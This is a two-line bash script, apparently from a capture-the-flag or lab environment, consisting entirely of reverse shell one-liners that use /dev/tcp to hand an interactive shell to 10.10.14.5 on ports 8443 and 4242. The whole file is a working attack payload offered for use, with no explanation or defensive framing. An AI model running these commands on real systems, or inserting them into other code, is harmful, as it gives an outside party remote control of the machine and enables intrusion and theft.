#!/bin/bash
bash -i >& /dev/tcp/10.10.14.5/8443 0>&1

/usr/bin/bash -l > /dev/tcp/10.10.14.5/4242 0<&1 2>&1
